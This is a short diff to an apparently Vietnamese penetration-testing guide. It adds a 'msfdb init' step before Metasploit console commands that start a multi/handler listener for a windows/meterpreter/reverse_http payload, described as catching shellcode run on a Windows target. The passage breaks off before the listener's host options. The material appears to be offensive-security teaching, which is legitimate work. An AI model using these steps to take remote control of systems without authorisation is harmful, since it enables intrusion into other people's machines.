@@ -38,6 +38,7 @@ popd <Đường dẫn UNC>
 Thực thi shellcode (file python) trên máy Windows và tạo listener trên máy tấn công với các lệnh sau:
 ```
 # Exploit after met.exe execution
+$ sudo msfdb init
 $ msfconsole
 msf> use exploit/multi/handler
 msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
